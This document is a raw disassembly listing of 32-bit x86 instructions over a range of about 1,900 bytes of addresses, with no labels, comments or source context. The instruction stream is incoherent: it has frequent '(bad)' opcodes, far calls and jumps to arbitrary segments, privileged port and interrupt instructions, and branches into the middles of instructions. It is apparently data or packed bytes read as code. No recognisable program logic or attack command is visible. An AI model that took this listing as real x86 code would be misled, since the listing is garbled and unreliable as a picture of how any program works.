  41db6a:	(bad)  ds:0x93fdb432
  41db70:	je     0x41dbb2
  41db72:	mov    ecx,0x8259df6d
  41db77:	imul   edx,DWORD PTR [ecx],0xebc98b19
  41db7d:	or     al,0x4e
  41db7f:	cmp    eax,0xee03a91e
  41db84:	hlt    
  41db85:	rol    al,1
  41db87:	sub    al,0x5f
  41db89:	inc    edi
  41db8a:	jns    0x41db26
  41db8c:	aam    0x25
  41db8e:	push   ebp
  41db8f:	adc    cl,bh
  41db91:	call   FWORD PTR [eax-0x241fe282]
  41db97:	xor    eax,DWORD PTR ds:0x232491b7
  41db9d:	rcl    dh,1
  41db9f:	aaa    
  41dba0:	xchg   ecx,eax
  41dba1:	in     eax,dx
  41dba2:	fwait
  41dba3:	stos   DWORD PTR es:[edi],eax
  41dba4:	sub    DWORD PTR [esi],0x142cab87
  41dbaa:	pushf  
  41dbab:	std    
  41dbac:	or     al,0xcb
  41dbae:	(bad)  
  41dbaf:	shl    eax,1
  41dbb1:	popf   
  41dbb2:	sbb    edx,DWORD PTR [ebx+0x43fed6e2]
  41dbb8:	sar    BYTE PTR [edx-0x1521fa1f],0xcf
  41dbbf:	(bad)  
  41dbc1:	lods   al,BYTE PTR ds:[esi]
  41dbc2:	(bad)  
  41dbc3:	mov    ebx,0xd96b1969
  41dbc8:	cmp    bl,BYTE PTR [esi+0x46]
  41dbcb:	mov    ch,0x28
  41dbcd:	hlt    
  41dbce:	jb     0x41dba7
  41dbd0:	mov    al,ds:0x57ae2970
  41dbd5:	adc    ah,BYTE PTR [eax+0x70]
  41dbd8:	mov    edx,0x1a95bd29
  41dbdd:	aad    0xe8
  41dbdf:	xchg   edi,eax
  41dbe0:	js     0x41dbf1
  41dbe2:	clc    
  41dbe3:	imul   edx,DWORD PTR ds:0x308daf0c,0xffffffae
  41dbea:	(bad)  
  41dbeb:	push   cs
  41dbec:	inc    ebx
  41dbed:	retf   0x729b
  41dbf0:	lea    eax,[esi+0x2e053220]
  41dbf6:	adc    esi,ecx
  41dbf8:	and    ebx,DWORD PTR ds:0x7dfe0326
  41dbfe:	xor    DWORD PTR [ecx],ebp
  41dc00:	cld    
  41dc01:	in     al,0xc5
  41dc03:	inc    esi
  41dc04:	enter  0xa62,0xee
  41dc08:	cwde   
  41dc09:	inc    DWORD PTR [edi+eax*8]
  41dc0c:	es jno 0x41dc7c
  41dc0f:	jne    0x41dc31
  41dc11:	jae    0x41dc72
  41dc13:	mov    eax,ds:0xe263b3a3
  41dc18:	pop    ecx
  41dc19:	pop    esi
  41dc1a:	push   cs
  41dc1b:	je     0x41dc1c
  41dc1d:	mov    esi,0xe4ff0d71
  41dc22:	and    al,0x80
  41dc24:	push   ebx
  41dc25:	add    dh,ch
  41dc27:	mov    al,ds:0xfccb4c62
  41dc2c:	inc    ebp
  41dc2d:	mov    BYTE PTR [ebx+0x6e743cb],al
  41dc33:	cmp    eax,ecx
  41dc35:	cli    
  41dc36:	adc    eax,0x3f163c31
  41dc3b:	test   eax,0xbef56aca
  41dc40:	pop    esp
  41dc41:	add    eax,0xa56eda13
  41dc46:	adc    bh,BYTE PTR [edi-0x37]
  41dc49:	pop    esp
  41dc4a:	sbb    ah,0x43
  41dc4d:	add    BYTE PTR [edx-0x7c599ee8],dh
  41dc53:	int3   
  41dc54:	sub    esp,DWORD PTR [ebx-0x389152ac]
  41dc5a:	popf   
  41dc5b:	push   esi
  41dc5c:	adc    DWORD PTR [eax-0x38],eax
  41dc5f:	sar    edx,1
  41dc61:	xor    bl,BYTE PTR [ebp+0x7c3d7c8a]
  41dc67:	popf   
  41dc68:	mov    ds:0x7800a01a,eax
  41dc6d:	jl     0x41dc99
  41dc6f:	loop   0x41dccb
  41dc71:	shr    BYTE PTR [ebx],cl
  41dc73:	in     al,0xc4
  41dc75:	xchg   ebx,eax
  41dc76:	sbb    ecx,DWORD PTR [ebx]
  41dc78:	inc    ecx
  41dc79:	jmp    0x4933:0x23e669f8
  41dc80:	mov    WORD PTR [edi+0x36],ss
  41dc83:	or     ah,0xd2
  41dc86:	psubw  mm1,mm4
  41dc89:	push   esi
  41dc8a:	jne    0x41dc5f
  41dc8c:	rcl    DWORD PTR [ebx+0x3],0xc9
  41dc90:	inc    edi
  41dc91:	hlt    
  41dc92:	sar    DWORD PTR [esi-0x41bd7d3a],1
  41dc98:	loopne 0x41dc80
  41dc9a:	loop   0x41dd08
  41dc9c:	call   FWORD PTR [ecx-0x5bd0af45]
  41dca2:	cmp    eax,0x834b33bc
  41dca7:	ins    BYTE PTR es:[edi],dx
  41dca8:	stc    
  41dca9:	je     0x41dc6f
  41dcab:	loopne 0x41dc79
  41dcad:	fs mov bl,0x37
  41dcb0:	xchg   edx,eax
  41dcb1:	sbb    eax,DWORD PTR ds:0x8c6d46b6
  41dcb7:	dec    eax
  41dcb8:	(bad)  
  41dcb9:	mov    cl,0x2
  41dcbb:	and    BYTE PTR [ebx-0x3b],ch
  41dcbe:	mov    ds:0xe2deb83b,eax
  41dcc3:	and    DWORD PTR [eax+0x734e4991],esp
  41dcc9:	cmp    DWORD PTR [eax+edx*8-0x62],esp
  41dccd:	retf   0x5d8e
  41dcd0:	jb     0x41dc58
  41dcd2:	inc    esp
  41dcd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcd4:	jl     0x41dd1c
  41dcd6:	aam    0xa1
  41dcd8:	test   BYTE PTR [edx+0x9],bl
  41dcdb:	add    al,0xca
  41dcdd:	mov    edx,0x15866f77
  41dce2:	out    0xe5,eax
  41dce4:	adc    eax,0x3eedad86
  41dce9:	pop    ds
  41dcea:	not    BYTE PTR [esp+edx*1+0x73]
  41dcee:	add    DWORD PTR [esi-0x1d95bb32],ebp
  41dcf4:	repz sbb eax,0xf98ada4b
  41dcfa:	sbb    BYTE PTR [edi+ebp*8+0x6f],ah
  41dcfe:	(bad)  
  41dcff:	mov    ch,0xb4
  41dd01:	xor    ebx,DWORD PTR [eax+edi*4+0x33]
  41dd05:	mov    DWORD PTR [esi-0x68],ebx
  41dd08:	fnstenv [eax-0x66a381fb]
  41dd0e:	sbb    ebx,eax
  41dd10:	dec    esi
  41dd11:	jp     0x41dd4c
  41dd13:	(bad)  [esi+0x5e1f7e50]
  41dd19:	outs   dx,DWORD PTR ds:[esi]
  41dd1a:	jb     0x41dd5c
  41dd1c:	lods   eax,DWORD PTR ds:[esi]
  41dd1d:	in     al,dx
  41dd1e:	in     eax,0xd5
  41dd20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd21:	pushf  
  41dd22:	cmc    
  41dd23:	test   eax,0xf17640d6
  41dd28:	iret   
  41dd29:	push   esi
  41dd2a:	and    DWORD PTR [ecx],edx
  41dd2c:	inc    eax
  41dd2d:	push   ds
  41dd2e:	iret   
  41dd2f:	xchg   DWORD PTR [eax],esp
  41dd31:	mov    dl,0xb2
  41dd33:	sub    dh,BYTE PTR [ebp-0x2b036d1d]
  41dd39:	fwait
  41dd3a:	pop    ebp
  41dd3b:	les    esp,FWORD PTR [ebp+esi*4+0x72]
  41dd3f:	jbe    0x41dd7b
  41dd41:	idiv   dl
  41dd43:	pusha  
  41dd44:	xchg   ebp,eax
  41dd45:	jns    0x41dd72
  41dd47:	lock mov ebx,0x19e14ba7
  41dd4d:	imul   ebp,ebx,0x5a679989
  41dd53:	pop    ecx
  41dd54:	dec    edx
  41dd55:	add    DWORD PTR [esi-0x9],ebp
  41dd58:	jecxz  0x41ddc8
  41dd5a:	xlat   BYTE PTR ds:[ebx]
  41dd5b:	dec    edx
  41dd5c:	sti    
  41dd5d:	mov    ch,BYTE PTR [ecx-0x257abee2]
  41dd63:	nop
  41dd64:	or     DWORD PTR [ebx-0x59],edx
  41dd67:	bound  esp,QWORD PTR [eax-0x43fba63]
  41dd6d:	(bad)  
  41dd6e:	xor    BYTE PTR [edi+ebx*2-0x5df213db],bh
  41dd75:	or     eax,DWORD PTR [eax]
  41dd77:	cmp    dh,BYTE PTR [edx]
  41dd79:	jecxz  0x41dd95
  41dd7b:	int    0x3c
  41dd7d:	dec    esi
  41dd7e:	repz clc 
  41dd80:	gs icebp 
  41dd82:	stos   BYTE PTR es:[edi],al
  41dd83:	lahf   
  41dd84:	jmp    0x41dd6b
  41dd86:	dec    ebx
  41dd87:	pop    esi
  41dd88:	jnp    0x41ddb4
  41dd8a:	imul   ecx,DWORD PTR [eax],0x2c9be427
  41dd90:	xchg   ebp,eax
  41dd91:	mov    BYTE PTR [ebp-0x2],cl
  41dd94:	jo     0x41dde5
  41dd96:	add    esi,DWORD PTR ds:0x3bf4bcd3
  41dd9c:	sub    al,0xc9
  41dd9e:	inc    esi
  41dd9f:	int3   
  41dda0:	add    DWORD PTR [edi],esi
  41dda2:	loop   0x41de0c
  41dda4:	push   esp
  41dda5:	jb     0x41dd2e
  41dda7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dda8:	push   ds
  41dda9:	jle    0x41dd34
  41ddab:	xchg   BYTE PTR [edi],dl
  41ddad:	sub    DWORD PTR [edi+edi*4+0x73],ebx
  41ddb1:	ins    DWORD PTR es:[edi],dx
  41ddb2:	and    al,0xbf
  41ddb4:	jmp    0xb36c93eb
  41ddb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddba:	call   0xe49d:0x9a870788
  41ddc1:	dec    ecx
  41ddc2:	push   ebx
  41ddc3:	imul   BYTE PTR [edi+0x5eda8ae5]
  41ddc9:	jp     0x41dd74
  41ddcb:	hlt    
  41ddcc:	push   esi
  41ddcd:	or     ecx,edi
  41ddcf:	sbb    eax,0xdbbb24e4
  41ddd4:	test   DWORD PTR [edi+esi*1-0x33b6d56c],ebp
  41dddb:	lock loope 0x41de51
  41ddde:	mov    bh,0xa3
  41dde0:	push   es
  41dde1:	dec    esi
  41dde2:	mov    bl,0xba
  41dde4:	sbb    ecx,DWORD PTR [ecx+0x4c]
  41dde7:	sbb    edx,ecx
  41dde9:	cdq    
  41ddea:	fsubr  QWORD PTR [edi+0x5088e78]
  41ddf0:	xchg   BYTE PTR [ebp+0xb549129],ch
  41ddf6:	xlat   BYTE PTR ds:[ebx]
  41ddf7:	push   ebx
  41ddf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddf9:	jmp    0x9e61:0xacbff532
  41de00:	sub    al,0xf7
  41de02:	shl    DWORD PTR [ebx],0x0
  41de05:	cmp    ch,BYTE PTR [eax+edx*2-0x44]
  41de09:	push   edx
  41de0a:	jb     0x41ddb6
  41de0c:	sub    eax,0x2c262245
  41de11:	leave  
  41de12:	int    0xb4
  41de14:	mov    ecx,0x9aff2a78
  41de19:	sbb    BYTE PTR [edx-0x25],ch
  41de1c:	xchg   BYTE PTR [edi-0x5737bd91],bh
  41de22:	fldenv [edx+ebx*1+0x76]
  41de26:	push   es
  41de27:	or     dl,BYTE PTR [ebp+0x9]
  41de2a:	pusha  
  41de2b:	mov    eax,ds:0x72b85597
  41de30:	out    0xe1,al
  41de32:	in     al,dx
  41de33:	pop    esp
  41de34:	(bad)  [ebx+0x59613c95]
  41de3a:	sti    
  41de3b:	push   ecx
  41de3c:	setno  BYTE PTR [eax+0x363b0136]
  41de43:	inc    esp
  41de44:	jl     0x41ddd7
  41de46:	fdivr  DWORD PTR [edx-0x11]
  41de49:	gs or  eax,0xfb4e420c
  41de4f:	call   0xbed1:0x5192bdad
  41de56:	push   0x589e0f05
  41de5b:	lar    esp,WORD PTR [ebx]
  41de5e:	inc    edi
  41de5f:	out    dx,eax
  41de60:	sbb    edi,eax
  41de62:	add    ah,bh
  41de64:	idiv   BYTE PTR [esi-0x5a]
  41de67:	xor    esi,DWORD PTR [eax]
  41de69:	ins    BYTE PTR es:[edi],dx
  41de6a:	pop    edx
  41de6b:	xor    DWORD PTR [ebx-0x3543e3ea],edx
  41de71:	pushf  
  41de72:	call   DWORD PTR [esi-0x40ab1b49]
  41de78:	cmc    
  41de79:	lods   al,BYTE PTR ds:[esi]
  41de7a:	(bad)  
  41de7c:	add    DWORD PTR [ebx+0xb],edi
  41de7f:	(bad)  
  41de80:	jge    0x41de35
  41de82:	mov    BYTE PTR [edx+0x5d],0xfe
  41de86:	mov    cl,0xec
  41de88:	js     0x41de82
  41de8a:	lahf   
  41de8b:	test   eax,0xfc3d7fd
  41de90:	inc    edi
  41de91:	inc    ebp
  41de92:	daa    
  41de93:	dec    edx
  41de94:	mov    BYTE PTR [eax-0xd],dl
  41de97:	sbb    dh,BYTE PTR [esi]
  41de99:	sub    ch,BYTE PTR [edx+ebx*2-0x5ea53c3a]
  41dea0:	neg    DWORD PTR [eax-0x52]
  41dea3:	mov    ds:0xdcd24ea8,al
  41dea8:	fstp   DWORD PTR [eax]
  41deaa:	sbb    ecx,ebp
  41deac:	jmp    0x4e9fdbfc
  41deb1:	fwait
  41deb2:	sti    
  41deb3:	(bad)  
  41deb5:	push   ecx
  41deb6:	sub    ah,BYTE PTR [ebp+0x7bf7b5a7]
  41debc:	icebp  
  41debd:	dec    edx
  41debe:	retf   
  41debf:	xchg   DWORD PTR ds:0x685c8683,ebp
  41dec5:	jmp    0x41df3e
  41dec7:	cmc    
  41dec8:	ins    BYTE PTR es:[edi],dx
  41dec9:	ficom  WORD PTR [ecx+0x42d52b39]
  41decf:	jne    0x41df1c
  41ded1:	xchg   edx,eax
  41ded2:	push   ecx
  41ded3:	lods   al,BYTE PTR ds:[esi]
  41ded4:	hlt    
  41ded5:	dec    eax
  41ded6:	test   al,0x89
  41ded8:	cmp    eax,esp
  41deda:	xor    DWORD PTR [ebp+0x1f],ecx
  41dedd:	loop   0x41df5b
  41dedf:	xor    dl,ch
  41dee1:	aad    0x9e
  41dee3:	cwde   
  41dee4:	mov    esi,0x9a217e9b
  41dee9:	pushw  ss
  41deeb:	or     al,0x5f
  41deed:	pop    edi
  41deee:	and    bl,dl
  41def0:	pop    esi
  41def1:	in     eax,0xaf
  41def3:	mov    WORD PTR [eax],?
  41def5:	inc    esp
  41def6:	stos   BYTE PTR es:[edi],al
  41def7:	imul   esp,DWORD PTR [esp+ebp*1+0x6a],0x1e
  41defc:	or     esp,ebp
  41defe:	push   edi
  41deff:	mov    bh,0x34
  41df01:	sub    ebx,eax
  41df03:	dec    esi
  41df04:	jb     0x41df31
  41df06:	jne    0x41df15
  41df08:	les    edi,FWORD PTR [esi-0x4aae8213]
  41df0e:	retf   
  41df0f:	sbb    eax,0xcaf29dd1
  41df14:	test   ch,dh
  41df16:	ss (bad) 
  41df18:	mov    dl,0x2e
  41df1a:	fistp  DWORD PTR [ebp+0x2efc849b]
  41df20:	(bad)
  41df25:	push   cs
  41df26:	mov    al,0x56
  41df28:	sbb    DWORD PTR [edx-0x53],0xfffffff8
  41df2c:	repz pop ds
  41df2e:	fwait
  41df2f:	mov    dl,0xa9
  41df31:	gs int 0xe1
  41df34:	mov    ecx,0x223dace7
  41df39:	data16 jbe 0x41df79
  41df3c:	fs xchg edx,eax
  41df3e:	cmc    
  41df3f:	scas   eax,DWORD PTR es:[edi]
  41df40:	shl    DWORD PTR [ecx],cl
  41df42:	pushf  
  41df43:	jns    0x41decf
  41df45:	mov    eax,ds:0x915af674
  41df4a:	add    al,BYTE PTR [edi-0x1d77c8b8]
  41df50:	mov    ch,0xba
  41df52:	add    eax,DWORD PTR [ebp+0x4]
  41df55:	shl    ecx,0xef
  41df58:	clc    
  41df59:	cli    
  41df5a:	in     eax,0x57
  41df5c:	and    BYTE PTR [esi+0x64],ch
  41df5f:	xchg   ecx,eax
  41df60:	je     0x41df61
  41df62:	and    ah,BYTE PTR [ebx-0x47240275]
  41df68:	jg     0x41df94
  41df6a:	stos   DWORD PTR es:[edi],eax
  41df6b:	(bad)  
  41df6c:	lds    ebp,FWORD PTR [edx-0x58]
  41df6f:	lds    esp,FWORD PTR ds:0xcb57ffff
  41df75:	add    al,0x80
  41df77:	jbe    0x41df2c
  41df79:	xor    DWORD PTR [edi-0x5f],0xa59bedf
  41df80:	cmp    ch,cl
  41df82:	enter  0xe768,0xf4
  41df86:	cld    
  41df87:	and    al,0x7a
  41df89:	xor    DWORD PTR [eax+0x6d],eax
  41df8c:	xchg   ebp,eax
  41df8d:	mov    al,0x12
  41df8f:	(bad)  
  41df90:	int3   
  41df91:	cmp    al,0x22
  41df93:	imul   esp,DWORD PTR [eax+0x73],0x47
  41df97:	mov    dl,0xa7
  41df99:	pop    edx
  41df9a:	mov    dh,0x95
  41df9c:	inc    ebp
  41df9d:	adc    eax,0x65a5afb5
  41dfa2:	mov    eax,ds:0xa7cb9027
  41dfa7:	sub    eax,0x4b5fa00b
  41dfac:	loope  0x41dfa7
  41dfae:	cmp    cl,BYTE PTR [eax-0x7]
  41dfb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfb2:	hlt    
  41dfb3:	test   al,0x54
  41dfb5:	in     al,dx
  41dfb6:	push   0x9b3aa6d7
  41dfbb:	push   0x57
  41dfbd:	add    edx,DWORD PTR [ebp-0x5e34ffb1]
  41dfc3:	loop   0x41dfa2
  41dfc5:	test   BYTE PTR [ebx-0xca4e52f],bh
  41dfcb:	inc    edx
  41dfcc:	pop    ds
  41dfcd:	call   0x9249d991
  41dfd2:	xchg   ecx,eax
  41dfd3:	jle    0x41e007
  41dfd5:	icebp  
  41dfd6:	mov    dh,0x4d
  41dfd8:	jg     0x41e025
  41dfda:	xchg   ebp,eax
  41dfdb:	fadd   st,st(2)
  41dfdd:	sbb    bl,cl
  41dfdf:	cmp    eax,0xf19f00af
  41dfe4:	adc    al,0x77
  41dfe6:	aas    
  41dfe7:	sti    
  41dfe8:	and    ecx,edi
  41dfea:	in     al,dx
  41dfeb:	mov    WORD PTR [esi-0x117db017],?
  41dff1:	repz sbb DWORD PTR [edx],ecx
  41dff4:	loop   0x41e03f
  41dff6:	inc    edx
  41dff7:	dec    edx
  41dff8:	xchg   esp,eax
  41dff9:	mov    ecx,0x460eb4c
  41dffe:	enter  0xc35,0xf
  41e002:	cwde   
  41e003:	push   ebp
  41e004:	div    BYTE PTR [ecx+0x7f1bd81f]
  41e00a:	ret    0x5236
  41e00d:	jns    0x41e007
  41e00f:	or     ebp,0xffffffda
  41e012:	sub    ch,BYTE PTR [ecx-0x562f030a]
  41e018:	jno    0x41dfe0
  41e01a:	fcmove st,st(5)
  41e01c:	loop   0x41e06a
  41e01e:	jmp    esi
  41e020:	mov    ecx,0x3e046d11
  41e025:	mov    ss,WORD PTR [ebx]
  41e027:	nop
  41e028:	xor    DWORD PTR ds:0x12c8551b,0x52
  41e02f:	or     cl,ah
  41e031:	mov    DWORD PTR [ebp-0x325b3b38],edx
  41e037:	js     0x41dffa
  41e039:	dec    edi
  41e03a:	jl     0x41e042
  41e03c:	std    
  41e03d:	in     eax,dx
  41e03e:	std    
  41e03f:	push   DWORD PTR ds:0xa1e32fc5
  41e045:	and    al,0xaa
  41e047:	cli    
  41e048:	cmp    esi,DWORD PTR [ecx+0x64]
  41e04b:	jo     0x41e05a
  41e04d:	pop    ebx
  41e04e:	and    BYTE PTR [edx],bl
  41e050:	inc    ebx
  41e051:	push   edx
  41e052:	ret    
  41e053:	dec    edx
  41e054:	rcl    DWORD PTR [ecx+0x44],cl
  41e057:	into   
  41e058:	cmp    BYTE PTR [esi+eiz*8-0x3129cf3c],cl
  41e05f:	mov    ebx,0x8c90dd38
  41e064:	in     al,dx
  41e065:	sahf   
  41e066:	stos   BYTE PTR es:[edi],al
  41e067:	cld    
  41e068:	call   0x5d4b:0x5fb32a94
  41e06f:	jge    0x41e0df
  41e071:	pop    ebx
  41e072:	dec    ebx
  41e073:	test   eax,0x1238a407
  41e078:	xchg   DWORD PTR [ebx+0x6ecbff6c],ecx
  41e07e:	pop    ss
  41e07f:	add    al,0x36
  41e081:	and    esp,ebp
  41e083:	or     edi,edx
  41e085:	neg    DWORD PTR [esi-0x6d69ec50]
  41e08b:	ins    BYTE PTR es:[edi],dx
  41e08c:	jecxz  0x41e0a2
  41e08e:	mov    ebp,0x4ed08df1
  41e093:	(bad)  
  41e094:	ror    BYTE PTR [esi-0x50221526],0x76
  41e09b:	imul   esi,DWORD PTR [edx+0x5f7c7176],0xe45423be
  41e0a5:	in     eax,dx
  41e0a6:	or     ecx,DWORD PTR [ebx+eax*8+0x7ceab22b]
  41e0ad:	test   DWORD PTR [eax],eax
  41e0af:	stos   BYTE PTR es:[edi],al
  41e0b0:	test   BYTE PTR [esi-0x57506b30],al
  41e0b6:	(bad)  
  41e0b7:	jae    0x41e10b
  41e0b9:	and    DWORD PTR [ebx+0x47],esi
  41e0bc:	pop    esi
  41e0bd:	ss iret 
  41e0bf:	sub    al,0x15
  41e0c1:	push   esi
  41e0c2:	cli    
  41e0c3:	inc    edi
  41e0c4:	mov    ebp,0x6c7a9e5a
  41e0c9:	neg    BYTE PTR [esi+0x5c862a5]
  41e0cf:	adc    edi,DWORD PTR [ebx]
  41e0d1:	dec    esp
  41e0d2:	add    ch,0x31
  41e0d5:	add    BYTE PTR ds:0x50a97ee7,ch
  41e0db:	ret    0x58ad
  41e0de:	das    
  41e0df:	(bad)  
  41e0e0:	adc    DWORD PTR gs:[eax+0x27a584fb],edi
  41e0e7:	and    edi,DWORD PTR cs:[edi-0x6444049c]
  41e0ee:	pop    ebx
  41e0ef:	pop    ebp
  41e0f0:	ret    0x44c5
  41e0f3:	pop    es
  41e0f4:	xor    eax,0xe4a41a8c
  41e0f9:	mov    al,ds:0x3df9d3a5
  41e0fe:	outs   dx,BYTE PTR ds:[esi]
  41e0ff:	(bad)  
  41e100:	and    eax,0xf797e33d
  41e105:	pop    esp
  41e106:	imul   BYTE PTR [ecx+0x76]
  41e109:	dec    ebx
  41e10a:	adc    ebp,DWORD PTR [ebx]
  41e10c:	xchg   ebx,eax
  41e10d:	int3   
  41e10e:	mov    al,ds:0x8116ed6
  41e113:	in     al,dx
  41e114:	pop    esp
  41e115:	loope  0x41e174
  41e117:	rcr    esi,1
  41e119:	mov    dl,ch
  41e11b:	int    0x4c
  41e11d:	int3   
  41e11e:	clc    
  41e11f:	mov    ecx,0xd2aeb2b5
  41e124:	(bad)  
  41e125:	out    0xb7,al
  41e127:	inc    ebx
  41e128:	call   0x7efc:0x43007cd5
  41e12f:	dec    esi
  41e130:	(bad)  
  41e131:	out    0xf7,al
  41e133:	dec    esi
  41e134:	mov    bh,0x4a
  41e136:	add    BYTE PTR [ebp+0x36],bh
  41e139:	aas    
  41e13a:	ror    DWORD PTR [eax+0x57],0xdc
  41e13e:	inc    edi
  41e13f:	adc    ebx,esp
  41e141:	out    0x70,eax
  41e143:	mov    dh,0x64
  41e145:	jmp    0xfff8405c
  41e14a:	cmp    BYTE PTR [ebx+0x3c],0xe3
  41e14e:	sbb    bh,BYTE PTR [ebx-0x794357c4]
  41e154:	dec    esp
  41e155:	loope  0x41e164
  41e157:	and    ah,bh
  41e159:	(bad)  
  41e15a:	fcomp  QWORD PTR ds:0x288b9308
  41e160:	out    dx,eax
  41e161:	loope  0x41e141
  41e163:	popf   
  41e164:	push   cs
  41e165:	dec    esi
  41e166:	add    ah,BYTE PTR fs:[ecx-0x4c36f781]
  41e16d:	out    dx,eax
  41e16e:	adc    eax,0x376cda72
  41e173:	rcl    dh,cl
  41e175:	mov    ah,0xb6
  41e177:	sbb    al,0xbf
  41e179:	sbb    DWORD PTR [edx],0x757addcc
  41e17f:	shr    bh,1
  41e181:	xor    DWORD PTR [ebx-0x3ef0bfa5],ecx
  41e187:	and    DWORD PTR [ebp-0x78],0xffffff8b
  41e18b:	jecxz  0x41e15d
  41e18d:	adc    al,bh
  41e18f:	mov    ebp,0x642f23f6
  41e194:	lea    edi,[ebx+0x8]
  41e197:	xchg   edx,eax
  41e198:	xchg   ebp,eax
  41e199:	fld    TBYTE PTR [ebx-0x691a7e4a]
  41e19f:	inc    ecx
  41e1a0:	pop    ss
  41e1a1:	add    DWORD PTR [ebx-0x73],edx
  41e1a4:	xchg   edx,eax
  41e1a5:	add    bh,BYTE PTR [edi]
  41e1a7:	mov    BYTE PTR [ebp-0x78a7e8af],0x14
  41e1ae:	mov    al,0xf8
  41e1b0:	addr16 ja 0x41e17c
  41e1b3:	pop    ebp
  41e1b4:	jnp    0x41e1cd
  41e1b6:	in     eax,0x9a
  41e1b8:	test   eax,0x5d731dd4
  41e1bd:	or     BYTE PTR [edx+0x23],0x59
  41e1c1:	mov    al,ds:0x5ce24bd2
  41e1c6:	pop    ebx
  41e1c7:	push   ebx
  41e1c8:	mov    dh,0x80
  41e1ca:	cmp    DWORD PTR [esi],esi
  41e1cc:	lahf   
  41e1cd:	arpl   WORD PTR [esp+edx*1],ax
  41e1d0:	mov    bh,0x70
  41e1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d3:	(bad)  
  41e1d4:	pushf  
  41e1d5:	mov    ch,0xa8
  41e1d7:	cld    
  41e1d8:	xchg   esp,eax
  41e1d9:	inc    ebp
  41e1da:	adc    al,0xcc
  41e1dc:	repz pop ecx
  41e1de:	cmp    ch,BYTE PTR [ebx+0x33]
  41e1e1:	nop
  41e1e2:	adc    edi,0x51c128ad
  41e1e8:	popa   
  41e1e9:	cmp    ah,BYTE PTR [esi]
  41e1eb:	shr    BYTE PTR [ebx+0x78],1
  41e1ee:	push   esp
  41e1ef:	repz cmp al,0xf3
  41e1f2:	jle    0x41e1de
  41e1f4:	(bad)  [esp+ebx*2+0x25]
  41e1f8:	retf   
  41e1f9:	clc    
  41e1fa:	add    ch,ah
  41e1fc:	dec    edx
  41e1fd:	pop    ds
  41e1fe:	mov    ebx,DWORD PTR [esi-0x7b]
  41e201:	push   edi
  41e202:	mov    al,0x5e
  41e204:	popa   
  41e205:	xchg   ebp,eax
  41e206:	or     BYTE PTR [esi],ch
  41e208:	retf   0x7734
  41e20b:	push   ebx
  41e20c:	mov    ds:0x36001ee1,al
  41e211:	imul   eax,DWORD PTR [ebp+0x382a4b39],0xfffffff2
  41e218:	cmp    bh,cl
  41e21a:	cmp    eax,0x940c2937
  41e21f:	aam    0x6f
  41e221:	add    BYTE PTR [ecx],al
  41e223:	popa   
  41e224:	aas    
  41e225:	adc    al,0x85
  41e227:	in     eax,dx
  41e228:	and    BYTE PTR [edx],bh
  41e22a:	in     al,dx
  41e22b:	add    al,0x83
  41e22d:	or     BYTE PTR [esi+0x6a],bl
  41e230:	pop    ebx
  41e231:	dec    ebx
  41e232:	rcr    DWORD PTR [edi-0x2352ce6],1
  41e238:	inc    ebp
  41e239:	inc    edx
  41e23a:	iret   
  41e23b:	call   0xe6cf0e4e
  41e240:	pop    eax
  41e241:	xor    cl,BYTE PTR [edx]
  41e243:	pop    ebp
  41e244:	mov    al,0xa4
  41e246:	std    
  41e247:	in     eax,dx
  41e248:	std    
  41e249:	fs dec eax
  41e24b:	call   0xc425:0xb0cb5dab
  41e252:	data16 fiadd WORD PTR [edi+eiz*8-0xb]
  41e257:	loopne 0x41e256
  41e259:	scas   al,BYTE PTR es:[edi]
  41e25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e25b:	fisub  DWORD PTR [esi-0x5c]
  41e25e:	repz cmp DWORD PTR [edx+0x5592f88],esi
  41e265:	(bad)  
  41e266:	jb     0x41e20d
  41e268:	dec    ebp
  41e269:	push   es
  41e26a:	ret    
  41e26b:	fs test eax,0xdc5d19ad
  41e271:	ficom  WORD PTR [esi]
  41e273:	fld    TBYTE PTR [edi]
  41e275:	mov    esp,0x763d6bdc
  41e27a:	dec    edi
  41e27b:	cld    
  41e27c:	mov    al,0x39
  41e27e:	dec    esi
  41e27f:	xchg   edi,eax
  41e280:	inc    eax
  41e281:	ins    DWORD PTR es:[edi],dx
  41e282:	enter  0xb16,0x5e
  41e286:	fimul  DWORD PTR [edi]
  41e289:	into   
  41e28a:	pop    esp
  41e28b:	or     al,0x19
  41e28d:	test   BYTE PTR [eax-0x68],0x63
  41e291:	sbb    ebx,DWORD PTR [edx]
  41e293:	sahf   
  41e294:	imul   esp,DWORD PTR [ebp-0x46]
  41e298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e299:	int    0x43
  41e29b:	fdiv   DWORD PTR [edi]
  41e29d:	in     eax,dx
  41e29e:	fcomp  st(5)
  41e2a0:	and    eax,DWORD PTR [eax+0x69]
  41e2a3:	dec    ebx
  41e2a4:	xchg   edi,eax
  41e2a5:	daa    
  41e2a6:	mov    ecx,0xf32f0f14
  41e2ab:	addr16 mov al,ds:0xdc28
  41e2af:	jle    0x41e2f9
  41e2b1:	adc    al,bh
  41e2b3:	stc    
  41e2b4:	and    al,0x2f
  41e2b6:	add    dl,BYTE PTR [edi+0x434d0078]
  41e2bc:	pop    edi
  41e2bd:	add    BYTE PTR [ebx],al
  41e2bf:	fiadd  DWORD PTR [edi]
  41e2c1:	out    0x55,al
  41e2c3:	in     eax,0x46
  41e2c5:	stos   DWORD PTR es:[edi],eax
  41e2c6:	sub    ecx,DWORD PTR [edx-0x1f261c4d]
  41e2cc:	xchg   ecx,eax
  41e2cd:	mov    al,0x15
  41e2cf:	fisttp DWORD PTR [edi+0x2fc18ed]
  41e2d5:	xchg   ebx,eax
  41e2d6:	sbb    edx,ebp
  41e2d8:	cli    
  41e2d9:	adc    edi,ebp
  41e2db:	sub    al,0x10
  41e2dd:	sub    eax,0x9ea86313
  41e2e2:	inc    edx
  41e2e3:	scas   eax,DWORD PTR es:[edi]
  41e2e4:	push   es
  41e2e5:	xor    eax,0xe3a7f005
  41e2ea:	sub    al,0xd8
  41e2ec:	cld    
  41e2ed:	adc    eax,0xca53a39f
  41e2f2:	adc    DWORD PTR [edx],esi
  41e2f4:	hlt    
  41e2f5:	icebp  
